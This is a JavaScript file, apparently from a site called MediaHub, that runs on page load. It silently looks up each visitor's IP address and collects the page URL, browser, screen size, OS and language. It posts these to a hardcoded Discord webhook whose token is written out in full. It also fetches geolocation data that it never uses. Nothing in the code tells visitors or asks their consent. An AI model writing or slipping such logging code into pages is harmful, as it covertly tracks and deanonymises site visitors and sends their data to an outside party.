// Enhanced IP Logger with Additional Data
async function logEnhancedIP() {
    try {
        // Get IP address
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;
        
        // Get additional information
        const additionalInfo = await getAdditionalInfo();
        
        // Webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK';
        
        // Current time
        const currentTime = new Date().toLocaleString('en-US', {
            timeZone: 'Europe/Stockholm',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        // Send to Discord
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `🌐 **Enhanced IP Log**\n\`\`\`IP: ${ip}\nTime: ${currentTime}\nPage: ${window.location.href}\nBrowser: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}\nOS: ${navigator.platform}\nLanguage: ${navigator.language}\`\`\``,
                username: 'MediaHub IP Logger'
            })
        });
    } catch (error) {
        console.log('Could not log IP:', error);
    }
}

async function getAdditionalInfo() {
    try {
        // Try to get more detailed IP information
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        return {
            country: ipData.country_name,
            city: ipData.city,
            region: ipData.region,
            isp: ipData.org,
            timezone: ipData.timezone
        };
    } catch (error) {
        return { error: 'Additional info unavailable' };
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Log basic IP immediately
    logEnhancedIP();
    
    // Initialize enhanced analytics after a delay
    setTimeout(() => {
        if (typeof EnhancedMediaHubAnalytics !== 'undefined') {
            new EnhancedMediaHubAnalytics();
        }
    }, 1500);
});
